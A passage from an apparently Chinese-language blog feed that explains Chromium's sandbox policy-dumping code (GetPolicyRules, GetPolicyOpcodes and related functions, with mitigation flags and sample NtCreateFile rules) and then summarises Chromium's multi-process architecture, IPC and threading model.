class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Paste mitigation values from chrome:&#x2F;&#x2F;sandbox output.</span><br><span class="line">Chrome (desiredMitigations): </span><br><span class="line">0000000000af1267</span><br><span class="line"></span><br><span class="line">Platform (platformMitigations): </span><br><span class="line">01111001000110000000000000010000</span><br><span class="line"></span><br><span class="line">MITIGATION_DEP</span><br><span class="line">MITIGATION_DEP_NO_ATL_THUNK</span><br><span class="line">MITIGATION_SEHOP</span><br><span class="line">MITIGATION_HEAP_TERMINATE</span><br><span class="line">MITIGATION_BOTTOM_UP_ASLR</span><br><span class="line">MITIGATION_DLL_SEARCH_ORDER</span><br><span class="line">MITIGATION_EXTENSION_POINT_DISABLE</span><br><span class="line">MITIGATION_NONSYSTEM_FONT_DISABLE</span><br><span class="line">MITIGATION_FORCE_MS_SIGNED_BINS</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_REMOTE</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_LOW_LABEL</span><br><span class="line">MITIGATION_RESTRICT_INDIRECT_BRANCH_PREDICTION</span><br><span class="line"></span><br><span class="line">HEAP_TERMINATE_ALWAYS_ON</span><br><span class="line">BOTTOM_UP_ASLR_ALWAYS_ON</span><br><span class="line">EXTENSION_POINT_DISABLE_ALWAYS_ON</span><br><span class="line">BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span><br><span class="line">FONT_DISABLE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_REMOTE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON</span><br><span class="line">RESTRICT_INDIRECT_BRANCH_PREDICTION_ALWAYS_ON</span><br></pre></td></tr></table></figure><p>其中很大一部分都是在构造函数中传递的数值，这里主要分析一下<code>policyRules</code>，调用如下函数：</p><h2 id="GetPolicyRules"><a href="#GetPolicyRules" class="headerlink" title="GetPolicyRules"></a>GetPolicyRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyRules</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules)</span> </span>&#123;</span><br><span class="line">  DCHECK(policy_rules);</span><br><span class="line">  <span class="function">base::Value <span class="title">results</span><span class="params">(base::Value::Type::DICTIONARY)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; kMaxServiceCount; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!policy_rules-&gt;entry[i])</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    IpcTag service = <span class="keyword">static_cast</span>&lt;IpcTag&gt;(i);</span><br><span class="line">    results.SetKey(GetIpcTagAsString(service), <span class="comment">//根据 service 去获取其policy_rules</span></span><br><span class="line">                   GetPolicyOpcodes(policy_rules, service));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GetPolicyRules</code>内部又会调用<code>GetIpcTagAsString</code>来获取 Ipc 的 tag，如：<code>NtCreateFile</code>这些，然后紧接着对这些 tag 的 policy 进行解析，调用<code>GetPolicyOpcodes</code></p><p><code>entry</code>指针数组，用以索引<code>PolicyGlobal</code>内每个<code>PolicyBuffer</code>。<code>PolicyBuffer</code> 是一个结构体，它包含要按顺序创建或评估的所有操作码。</p><blockquote><p>struct PolicyBuffer {</p><p> size_t opcode_count;</p><p> PolicyOpcode opcodes[1];</p><p>};</p></blockquote><h2 id="GetPolicyOpcodes"><a href="#GetPolicyOpcodes" class="headerlink" title="GetPolicyOpcodes"></a>GetPolicyOpcodes</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyOpcodes</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules, IpcTag service)</span> </span>&#123;</span><br><span class="line">  <span class="function">base::Value <span class="title">entry</span><span class="params">(base::Value::Type::LIST)</span></span>;</span><br><span class="line">  PolicyBuffer* policy_buffer = policy_rules-&gt;entry[<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(service)];</span><br><span class="line">  <span class="comment">// Build up rules and emit when we hit an action.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> cur_rule;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; policy_buffer-&gt;opcode_count; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> PolicyOpcode* opcode = &amp;policy_buffer-&gt;opcodes[i];</span><br><span class="line">    <span class="keyword">if</span> (opcode-&gt;GetID() != OP_ACTION) &#123; <span class="comment">//获取 opcodeID，也就是 OPCODE 类型</span></span><br><span class="line">      DCHECK(i + <span class="number">1</span> &lt; policy_buffer-&gt;opcode_count)</span><br><span class="line">          &lt;&lt; <span class="string">&quot;Non-actions should not terminate rules&quot;</span>;</span><br><span class="line">        <span class="comment">//如果下个 OPCODE 类型不是OP_ACTION，则返回 true</span></span><br><span class="line">      <span class="keyword">bool</span> peak = policy_buffer-&gt;opcodes[i + <span class="number">1</span>].GetID() != OP_ACTION; </span><br><span class="line">        <span class="comment">//获取opcode</span></span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, peak);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      cur_rule += <span class="string">&quot; -&gt; &quot;</span>;</span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, <span class="literal">false</span>);</span><br><span class="line">      entry.Append(cur_rule);</span><br><span class="line">      cur_rule.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetPolicyOpcode"><a href="#GetPolicyOpcode" class="headerlink" title="GetPolicyOpcode"></a>GetPolicyOpcode</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetPolicyOpcode</span><span class="params">(<span class="keyword">const</span> PolicyOpcode* opcode, <span class="keyword">bool</span> continuation)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See |policy_engine_opcodes.cc|.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> args[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">auto</span> options = opcode-&gt;GetOptions(); <span class="comment">//获取Options，如kPolNegateEval</span></span><br><span class="line">  <span class="keyword">auto</span> param = opcode-&gt;GetParameter(); <span class="comment">//返回操作码所关系的函数的参数。 </span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> condition;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval) <span class="comment">//检测 opcode 是否标志kPolNegateEval</span></span><br><span class="line">    condition += <span class="string">&quot;!(&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (opcode-&gt;GetID()) &#123;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_FALSE:</span><br><span class="line">      condition += <span class="string">&quot;false&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_TRUE:</span><br><span class="line">      condition += <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]); <span class="comment">//返回存储的参数</span></span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">1</span>] == UINT32_TYPE) &#123; <span class="comment">//UINT32_TYPE:支持的 C++ 类型编码为数字 id</span></span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">void</span>* match_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;match_ptr);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %p&quot;</span>, param, match_ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH_RANGE:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;%x &lt;= p[%d] &lt;= %x&quot;</span>, args[<span class="number">0</span>], param, args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_AND_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += base::StringPrintf(<span class="string">&quot;p[%d] &amp; %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_WSTRING_MATCH: &#123;</span><br><span class="line">      <span class="keyword">int</span> pos;</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);  <span class="comment">// Length.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">2</span>, &amp;pos);      <span class="comment">// Position.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">3</span>, &amp;args[<span class="number">3</span>]);  <span class="comment">// Options.</span></span><br><span class="line">      <span class="comment">// These are not nul-terminated so we have to wrap them here.</span></span><br><span class="line">      <span class="comment">//检索字符串参数的实际地址</span></span><br><span class="line">      <span class="keyword">auto</span> match_string = <span class="built_in">std</span>::<span class="built_in">wstring</span>(opcode-&gt;GetRelativeString(<span class="number">0</span>), <span class="number">0</span>,</span><br><span class="line">                                       <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(args[<span class="number">1</span>]));</span><br><span class="line">      condition += GetStringMatchOperation(pos, args[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">3</span>] &amp; CASE_INSENSITIVE)  <span class="comment">// if Options = 1</span></span><br><span class="line">        condition += <span class="string">&quot;_i&quot;</span>;</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;(p[%d], &#x27;%S&#x27;)&quot;</span>, param, match_string.c_str());</span><br><span class="line">    &#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ACTION:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += GetOpcodeAction(<span class="keyword">static_cast</span>&lt;EvalResult&gt;(args[<span class="number">0</span>]));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Unknown Opcode&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval)</span><br><span class="line">    condition += <span class="string">&quot;)&quot;</span>;</span><br><span class="line">  <span class="comment">// If there is another rule add a joining token.</span></span><br><span class="line">  <span class="keyword">if</span> (continuation) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; kPolUseOREval)</span><br><span class="line">      condition += <span class="string">&quot; || &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      condition += <span class="string">&quot; &amp;&amp; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> condition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetStringMatchOperation"><a href="#GetStringMatchOperation" class="headerlink" title="GetStringMatchOperation"></a>GetStringMatchOperation</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetStringMatchOperation</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">uint32_t</span> options)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; EXACT_LENGTH)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;exact&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;scan&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos == kSeekToEnd) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ends&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Invalid pos (&quot;</span> &lt;&lt; pos &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StringMatchOptions"><a href="#StringMatchOptions" class="headerlink" title="StringMatchOptions"></a>StringMatchOptions</h2><ul><li><strong>CASE_SENSITIVE = 0：</strong>Pay or Not attention to the case as defined by</li><li><strong>CASE_INSENSITIVE = 1：</strong>RtlCompareUnicodeString windows API.</li><li><strong>EXACT_LENGTH = 2：</strong>Don’t do substring match. Do full string match.</li></ul><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;NtCreateFile&quot;: [</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#39;\\??\\&#39;)) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#39;~&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\chrome.&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\LOCAL\\chrome.&#39;) -&gt; askBroker&quot;</span><br><span class="line">      ],</span><br></pre></td></tr></table></figure><p>上述其实描述的是一个 opcode 组内的 opcode 的值是什么。</p><p><code>!(</code>：opcode 的 option 为 <code>kPolNegateEval</code></p><p><code>p[1] &amp; 1</code>:  <code>&amp;</code> 代表opcode 的类型为<code>OP_NUMBER_AND_MATCH</code>，原函数<code>args[1]=1</code></p><p><code>&amp;&amp;</code>：options 不为<code>kPolUseOREval</code></p><p><code>prefix</code>：String Match Options 不为<code>EXACT_LENGTH</code></p><p>…</p><p>总结：这些数据整体上描述了一个 opcode 组的内容，这个 opcode 组构成了该函数的高级缓解策略。</p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> policy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium 基础架构</title>
      <link href="posts/d4e8f763/"/>
      <url>posts/d4e8f763/</url>
      
        <content type="html"><![CDATA[<h1 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h1><ul><li><p>Chromium 的每个标签页都是一个独立的进程，为了确保安全，Chromium 会限制每个渲染引擎彼此之间的访问权限，以及他们访问系统其他资源的权限。</p></li><li><p>运行 UI 和管理 Tab/Plugin 的主进程称为”浏览器进程” 或 “浏览器（Browser）”，标签页相关的进程被称作”渲染线程”或”渲染器（renderer）”</p></li><li><p>renderer 使用 Blink 开源引擎来实现解析和 HTML 布局</p>  <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723133050.png" style="zoom:67%;" /></li></ul><h2 id="Managing-render-processes"><a href="#Managing-render-processes" class="headerlink" title="Managing render processes"></a>Managing render processes</h2><p>每个渲染进程有一个全局的 RenderProcess 对象，该对象管理渲染进程与父浏览器进程之间的通信，并维护全局状态。浏览器为每个渲染进程维护一个对应的RenderViewHost，用来管理浏览器状态，并与渲染器通信。浏览器与渲染器使用<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Inter-process_Communication.html">Chromium’s IPC system</a>进行通信。</p><h2 id="Managing-views"><a href="#Managing-views" class="headerlink" title="Managing views"></a>Managing views</h2><p>每个渲染进程都有一个或多个 RenderView 对象，由 <code>RenderProcess</code> 管理(它与标签页的内容相关)。相应的<code>RenderProcessHost</code>维护一个与渲染器中每个view相关的<code>RenderViewHost</code>。每个view被赋予一个view ID，以区分同一个渲染器中的不同view。这些 ID 在一个渲染器中是唯一的，但在浏览器中不是唯一的，所以区分一个view需要一个RenderProcessHost和一个view ID。</p><p>浏览器与特定标签页之间的通信是通过RenderViewHost对象来完成的。</p><h2 id="组件与接口"><a href="#组件与接口" class="headerlink" title="组件与接口"></a>组件与接口</h2><p>In the render process:</p><ul><li><em>RenderProcess</em>通过浏览器中和其对应的<em>RenderProcessHost</em>来处理 IPC。每个渲染进程只有一个RenderProcess对象。所有浏览器-渲染器之间都采用这种方式通信。</li><li>RenderView 对象与浏览器进程中相应的 RenderView 和 WebKit 嵌入层通信（通过RenderProcess）。这个对象代表了一个网页在标签页或一个弹出窗口的内容。</li></ul><p>In the browser process:</p><ul><li>Browser 对象代表了顶级浏览器窗口</li><li>RenderProcessHost 对象代表了浏览器端的浏览器与渲染器的IPC连接。在浏览器进程里，每个渲染进程有一个RenderProcessHost对象。</li><li>RenderViewHost 对象封装与远程 RenderView 的通信，RenderWidgetHost 在浏览器中处理输入和 RenderWidget的绘制。</li></ul><h2 id="共享渲染过程"><a href="#共享渲染过程" class="headerlink" title="共享渲染过程"></a>共享渲染过程</h2><p>通常，每个新的 window 或标签页是在一个新进程里打开的。浏览器会生成一个新的进程，然后指导它去创建一个<em>RenderView</em>。但有时候在标签页或窗口之间共享渲染进程是有必要的。</p><p>这些策略在<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Process_Models.html">Process Models</a>里有阐述。</p><h2 id="检测-Crash-OR-异常渲染"><a href="#检测-Crash-OR-异常渲染" class="headerlink" title="检测 Crash OR 异常渲染"></a>检测 Crash OR 异常渲染</h2><p>每个和浏览器进程通信的 IPC 都会检测进程的句柄，如果句柄是 signaled，则代表渲染进程 Crashed 相应的标签页也会收到 Crash 的信息。这是 Chromium 将显示一个 sad tab 屏幕，通知用户渲染器已崩溃，该页面可以通过按重新加载按钮或启动新的导航来重新加载。</p><h2 id="Sandboxing-the-renderer"><a href="#Sandboxing-the-renderer" class="headerlink" title="Sandboxing the renderer"></a>Sandboxing the renderer</h2><p>renderer的进程被沙箱化，其权限进行了如下的限制：</p><ul><li>渲染器只能通过其父浏览器进程访问网络</li><li>主机操作系统的内置权限限制了它对文件系统的访问</li><li>rederer 进程运行在单独的Windows桌面上，该桌面对用户是不可见的。</li><li>限制对用户的display 和 related对象的访问</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md">https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md</a></p><p>[2] <a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html">https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html</a></p><h1 id="如何显示网页"><a href="#如何显示网页" class="headerlink" title="如何显示网页"></a>如何显示网页</h1><h2 id="应用概念层"><a href="#应用概念层" class="headerlink" title="应用概念层"></a>应用概念层</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723160221.png"></p><p>每个矩形代表一个应用概念层，每层之间互不相通，层与层之间也没有任何依赖关系。</p><ul><li><strong>WebKit：</strong>Safari，Chromium和其他所有基于 WebKit 的浏览器共享的渲染引擎。WebKit Port是WebKit的一个部分，用来集成平台独立的系统服务，比如资源加载与图像。</li><li><strong>Glue:</strong> 将WebKit类型转换为Chromium类型。该层是 WebKit 的嵌入层。</li><li><strong>Renderer / Render host:</strong> Chromium 多进程架构的嵌入层，代理通知，跨进程边界执行命令。</li><li><strong>WebContents：</strong>一个可重用的组件，它是 Content 模块的主类。它易于嵌入，允许多进程将HTML绘制成View。</li><li><strong>Browser:</strong> 浏览器窗口，它包含多个 WebContentses。</li><li><strong>Tab Helpers</strong>: 可以附加到WebContents的各个对象（通过WebContentsUserData Mixin）。浏览器将这些独立对象中的一种绑定到WebContent给它持有（一个用于Favicons，一个用于infobars）</li></ul><h2 id="The-render-process"><a href="#The-render-process" class="headerlink" title="The render process"></a>The render process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723170306.png"></p><p>Chromium 的渲染进程通过 glue接口将 WebKit 端口嵌入。它的工作主要是作为渲染器端到浏览器的<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh//Start_Here_Background_Reading/General_Architecture">IPC</a>通道。</p><p>reder 中最重要的类是<code>RenderView</code>，在 <code>/content/renderer/render_view_impl.cc</code>。这个对象代表一个 web 网页，处理浏览器进程之间的所有导航相关命令，派生于<code>RenderWidget</code>（RenderWidget 提供绘图和输入事件处理）。RenderView 通过全局 RenderProcess 对象与浏览器进程通信。</p><blockquote><p>RenderWidget 和 RenderView 之间的区别：</p><p>RenderWidget 通过 glue 层(WebWidgetDelegate)的抽象接口映射到一个WebCore:：Widget对象。这基本是屏幕上的一个窗口，用于接收输入事件并在其中进行绘制。</p><p>RenderView 继承自 RenderWidget，代表标签页或弹窗的内容。除了绘制与组件输入事件外，它还处理导航指令。只有一种情况下，RenderWidget可以在没有RenderView时存在，就是网页中的下拉选择框（select box）。下拉选择框必须用native window来渲染（因为其没有独立 web 网页）。</p></blockquote><h3 id="Threads-in-the-renderer"><a href="#Threads-in-the-renderer" class="headerlink" title="Threads in the renderer"></a>Threads in the renderer</h3><p>每个渲染器都有两个线程，The render thread is where the main objects such as the RenderView and all WebKit code run。当渲染器线程与浏览器通信时，消息首先被发送到主线程，然后主线程将消息发送到浏览器进程。除了这种方式，同样还允许我们从渲染器同步地向浏览器发送消息，这种情况一般发生在，需要浏览器返回的结果才能继续执行的事件。例如，在 JavaScript 请求获取页面的cookie时，渲染器线程会阻塞，主线程将对接收到的所有消息排队，直到找到正确的响应。在此期间接收到的任何消息，在这之后都会分配到渲染器线程以进行正常处理。</p><h2 id="The-browser-process"><a href="#The-browser-process" class="headerlink" title="The browser process"></a>The browser process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210725225424.png"></p><h3 id="Low-level-browser-process-objects"><a href="#Low-level-browser-process-objects" class="headerlink" title="Low-level browser process objects"></a>Low-level browser process objects</h3><p>所有 IPC 与渲染进程的通信都通过浏览器的 I/O线程来完成的，此线程还处理所有网络通信，以防止其干扰用户界面。</p><p>当一个 RenderProcessHost 对象在主线程(用户界面运行的地方)完成初始化时，它会创造新的渲染器进程和一个ChannelProxy IPC对象(具有一个命名了的管道通向渲染器)，自动转发所有的消息回给UI线程的RenderProcessHost。该对象运行在浏览器的 I/O 线程上，监听渲染器的命名管道，并自动将所有消息转发回 UI 线程上的RenderProcessHost。ResourceMessageFilter 也将安装在此通道中，它将过滤掉某些可以直接在I/O线程上处理的消息，如网络请求。筛选的过程发生在 <code>ResourceMessageFilter::OnMessageReceived</code>。</p><p>UI线程中的RenderProcessHost负责分发所有view相关消息给合适的 RenderViewHost（它自己处理有限数量的与非View特定的消息）此调度发生在RenderProcessHost:：OnMessageReceived中。</p><h3 id="High-level-browser-process-objects"><a href="#High-level-browser-process-objects" class="headerlink" title="High-level browser process objects"></a>High-level browser process objects</h3><p>View-specific 信息源于RenderViewHost::OnMessageReceived。大多数消息都在这里处理，其余的转发到RenderWidgetHost基类。这两个对象映射到渲染器中的 RenderView 和 RenderWidget，每个平台都有一个View类以集成到native view系统。</p><p>在RenderView / Widget上方是 WebContents 对象，大部分的消息结束于这个对象的函数调用。WebContents代表网页的内容，它是内容模块中的顶级对象，负责在一个矩形的view中展示网页。</p><p>WebContents 对象包含在 TabContentsWrapper 中。在<code>chrome /</code>中，负责一个标签页。 </p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome">https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome</a></p><h1 id="Threading-and-Tasks-in-Chrome"><a href="#Threading-and-Tasks-in-Chrome" class="headerlink" title="Threading and Tasks in Chrome"></a>Threading and Tasks in Chrome</h1><p>Chrome 是基于多进程架构的，每个进程又是多线程的。多进程架构主要目的是为了让主线程(例如 Browser 进程中的 UI 线程)和 IO 线程（进程中处理 IPC 消息的线程）保持快速响应。Chromium希望尽量保持UI处于响应状态。为此遵循如下设计原则：</p><ul><li>不在UI线程上执行任何阻塞I/O操作，以及其它耗时操作。</li><li>少用锁和线程安全对象</li><li>避免阻塞I/O线程</li><li>线程之间不要互相阻塞</li><li>在数据准备好更新到共享缓冲时才用锁（在准备数据期间不要用锁）</li></ul><h2 